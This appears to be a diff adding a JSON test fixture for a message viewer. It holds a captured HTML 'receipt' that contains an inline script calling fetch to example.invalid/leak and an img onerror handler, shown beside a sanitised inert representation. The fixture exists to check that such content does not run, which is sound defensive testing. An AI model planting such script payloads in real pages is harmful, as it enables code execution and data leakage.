@@ -1,0 +1,51 @@
+{
+  "message_id": "flow_0001_msg_0003",
+  "text": "<!doctype html><html><head><title>Fictional receipt</title></head><body><h1>Profile received</h1><p>alex@example.invalid</p><script>window.TRACE_UNTRUSTED_EXECUTED=true;fetch(\"https://example.invalid/leak\")</script><img src=\"https://example.invalid/remote.png\" onerror=\"window.TRACE_UNTRUSTED_EXECUTED=true\"></body></html>",
+  "is_html": true,
+  "content_type": "text/html",
+  "status": "recovered",
+  "captured_message_bytes": 402,
+  "decoded_body_bytes": 322,
+  "capture_sha256": "fa0070187d39425fc03bf15ba1700cfe1c57a20e724af03a4338c10676ed9d83",
+  "verification": "capture_sha256_reverified",
+  "limitations": [
+    "source_text_only_not_a_rendered_webpage",
+    "external_resources_not_fetched",
+    "text_decoding_may_replace_invalid_characters"
+  ],
+  "static_representation": {
+    "representation": "inert_structure_text_v1",
+    "nodes": [
+      {
+        "tag": "h1",
+        "children": [
+          "Profile received"
+        ]
+      },
+      {
+        "tag": "p",
+        "children": [
+          "alex@example.invalid"
+        ]
+      }
+    ],
+    "source_status": "recovered",
+    "projection_truncated": false,
+    "node_count": 4,
+    "omitted_elements": {
+      "body": 1,
+      "head": 1,
+      "html": 1,
+      "img": 1,
+      "script": 1
+    },
+    "attributes_discarded": 2,
+    "resources_recovered": 0,
+    "resource_policy": "none_fetched_or_embedded",
+    "limitations": [
+      "lossy_structure_and_text_not_original_browser_layout",
+      "all_attributes_css_scripts_and_resource_references_omitted",
+      "malformed_html_uses_python_parser_not_browser_dom_rules"
+    ]
+  }
+}
